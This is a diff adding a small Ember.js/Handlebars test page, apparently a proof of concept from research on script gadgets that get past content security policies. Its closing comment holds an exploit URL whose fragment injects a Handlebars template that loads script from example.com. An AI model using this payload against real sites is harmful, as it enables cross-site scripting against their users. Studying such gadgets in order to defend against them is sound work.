@@ -1,0 +1,21 @@
+<!-- https://guides.emberjs.com/v1.10.0/templates/handlebars-basics/ -->
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ember.js/2.10.2/ember.prod.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ember.js/2.10.2/ember-runtime.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ember.js/2.10.2/ember-template-compiler.js"></script>
+
+<script type="text/x-handlebars" data-template-name="say-hello">
+    Hello, <strong>{{firstName}} {{lastName}}</strong>!
+</script>
+
+<script nonce="random">
+    App = Ember.Application.create();
+
+    App.ApplicationController = Ember.Controller.extend({
+        firstName: "Trek",
+        lastName: "Glowacki",
+    });
+</script>
+
+<!-- exploit: http://localhost:9000/?framework=ember&decode=true#<script type=text/x-handlebars><script src=//example.com/ /></script> -->
+<!-- triggered by hook during markup injection write -->
